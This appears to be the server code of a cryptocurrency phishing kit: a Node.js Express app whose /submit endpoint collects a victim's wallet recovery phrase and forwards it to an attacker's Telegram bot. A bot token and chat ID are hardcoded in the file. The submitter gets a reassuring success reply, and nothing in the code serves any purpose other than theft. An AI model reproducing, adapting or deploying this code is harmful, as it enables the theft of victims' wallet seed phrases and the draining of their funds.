const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const port = 3000;

// Telegram Bot Configuration
const telegramBotToken = '8012898137:AAHrkbdZwW7a3qIinIkPq2pgHrNN1pOX_-A'; // Your Bot Token
const chatId = '1353449624'; // Your Chat ID

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Endpoint to handle form submission
app.post('/submit', async (req, res) => {
    const { recoveryPhrase } = req.body;

    if (!recoveryPhrase) {
        return res.status(400).json({ message: 'Recovery phrase is required.' });
    }

    // Send recovery phrase to Telegram
    const message = `New recovery phrase received:\n${recoveryPhrase}`;
    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message }),
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.statusText}`);
        }

        res.status(200).json({ message: 'Recovery phrase submitted successfully.' });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.status(500).json({ message: 'Failed to submit. Please try again.' });
    }
});

// Start server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
